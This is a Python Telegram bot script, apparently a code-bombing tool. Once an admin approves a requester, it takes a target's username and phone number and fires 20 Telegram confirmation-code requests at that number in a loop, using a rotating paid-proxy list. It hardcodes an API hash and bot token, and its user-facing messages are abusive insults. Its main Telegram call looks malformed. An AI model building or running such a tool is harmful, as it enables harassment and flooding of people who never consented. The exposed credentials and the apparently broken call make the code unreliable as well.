import asyncio
from telethon import TelegramClient, events
from telethon.tl.functions.account import SendConfirmPhoneCodeRequest
from telethon.tl.types import CodeSettings
from telethon.tl.types import KeyboardButtonCallback
import aiohttp
import random

api_id = 35911533
api_hash = '11dafcdc1514796c867055023716d39a'
bot_token = '8346402249:AAGrv_AIuNJNJ06-Y2-vTASyB_NRgyzhJZI'
admin_id = 8471847665

proxy_list = []
with open('proxyscrape_premium_http_proxies (2).txt', 'r') as f:
    for line in f:
        line = line.strip()
        if line:
            parts = line.split('@')
            if len(parts) == 2:
                auth = parts[0].split(':')
                addr = parts[1].split(':')
                if len(auth) == 2 and len(addr) == 2:
                    proxy_list.append({
                        'login': auth[0],
                        'password': auth[1],
                        'ip': addr[0],
                        'port': int(addr[1])
                    })

client = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)

pending_requests = {}

@client.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.respond('tvoia zaiavka otpravlena')
    username = event.sender.username if event.sender.username else str(event.sender_id)
    await client.send_message(admin_id, f'ziavka ot @{username}', 
                              buttons=[[KeyboardButtonCallback('priniat', f'accept_{event.sender_id}'), 
                                        KeyboardButtonCallback('otklonit', f'reject_{event.sender_id}')]])

@client.on(events.CallbackQuery)
async def callback(event):
    data = event.data.decode()
    if data.startswith('accept_'):
        user_id = int(data.split('_')[1])
        pending_requests[user_id] = {'step': 'username'}
        await client.send_message(user_id, 'pishi username s @')
        await event.answer('priniato')
    elif data.startswith('reject_'):
        user_id = int(data.split('_')[1])
        await client.send_message(user_id, 'otkloneno idi nahui')
        await event.answer('otkloneno')

@client.on(events.NewMessage)
async def handle_input(event):
    sender = event.sender_id
    if sender == admin_id:
        return
    if sender not in pending_requests:
        return
    if pending_requests[sender]['step'] == 'username':
        username = event.text.strip()
        if not username.startswith('@'):
            await event.respond('pishi s @ debil')
            return
        pending_requests[sender]['username'] = username
        pending_requests[sender]['step'] = 'phone'
        await event.respond('phone:')
    elif pending_requests[sender]['step'] == 'phone':
        phone = event.text.strip()
        username = pending_requests[sender]['username']
        proxy = random.choice(proxy_list) if proxy_list else None
        try:
            for _ in range(20):
                async with aiohttp.ClientSession() as session:
                    async with session.get('http://httpbin.org/ip', 
                                           proxy=f"http://{proxy['login']}:{proxy['password']}@{proxy['ip']}:{proxy['port']}") as resp:
                        pass
                await client(SendConfirmPhoneCodeRequest(
                    phone_number=phone,
                    settings=CodeSettings(
                        allow_flashcall=False,
                        current_number=True,
                        allow_app_hash=False
                    )
                ))
                await asyncio.sleep(0.5)
            await event.respond('gatova tvoia mama sdohla')
        except Exception as e:
            await event.respond(f'oibka {str(e)}')
        del pending_requests[sender]

async def main():
    await client.start()
    await client.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
